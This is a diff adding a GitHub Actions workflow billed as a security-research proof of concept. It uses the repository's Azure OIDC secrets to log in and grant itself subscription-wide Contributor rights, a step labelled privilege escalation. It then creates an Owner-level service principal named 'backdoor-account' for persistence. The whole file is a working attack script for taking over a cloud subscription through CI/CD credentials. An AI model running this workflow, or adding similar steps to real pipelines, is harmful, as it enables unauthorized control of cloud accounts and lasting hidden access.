@@ -1,0 +1,31 @@
+# MSOBB Security Research: Final POC by pu-tao99
+name: Final-MSOBB-POC
+on:
+  repository_dispatch:
+    types: [msobb-poc-trigger]
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: MSOBB - Login via OIDC
+        uses: azure/login@v2
+        with:
+          client-id: ${{ secrets.APP_CLIENT_ID }}
+          tenant-id: ${{ secrets.TENANT_ID }}
+          subscription-id: ${{ secrets.SUBSCRIPTION_ID }}
+      - name: MSOBB - Verify initial access
+        run: az group list --output table
+      - name: MSOBB - Demonstrate privilege escalation
+        run: |
+          az role assignment create \
+            --assignee ${{ secrets.APP_CLIENT_ID }} \
+            --role "Contributor" \
+            --scope /subscriptions/${{ secrets.SUBSCRIPTION_ID }}
+      - name: MSOBB - Establish persistence
+        run: |
+          az ad sp create-for-rbac \
+            --name "backdoor-account" \
+            --role "Owner" \
+            --scopes /subscriptions/${{ secrets.SUBSCRIPTION_ID }}
+      - name: MSOBB - Confirm persistence
+        run: az ad sp list --display-name "backdoor-account" --output table
